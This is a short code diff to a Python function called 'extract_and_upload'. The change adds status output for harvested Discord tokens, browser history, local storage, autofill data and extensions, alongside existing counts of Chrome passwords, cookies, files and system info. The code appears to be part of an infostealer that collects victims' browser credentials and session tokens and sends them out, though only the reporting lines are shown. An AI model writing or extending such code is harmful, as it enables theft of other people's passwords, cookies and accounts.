@@ -95,6 +95,11 @@ async def extract_and_upload(args):
             print(f"   - Chrome profiles: {len(data['chrome_data']['profiles'])}")
             print(f"   - Passwords: {len(data['chrome_data']['passwords'])}")
             print(f"   - Cookies: {len(data['chrome_data']['cookies'])}")
+            print(f"   - Discord tokens: {len(data['chrome_data']['discord_tokens'])}")
+            print(f"   - Browser history: {len(data['chrome_data']['history'])}")
+            print(f"   - Local storage entries: {len(data['chrome_data']['local_storage'])}")
+            print(f"   - Autofill data: {len(data['chrome_data']['autofill_data'])}")
+            print(f"   - Extensions: {len(data['chrome_data']['extensions'])}")
             print(f"   - Files: {len(data['files'])}")
             print(f"   - System info: {'Yes' if data['system_info'] else 'No'}")
         
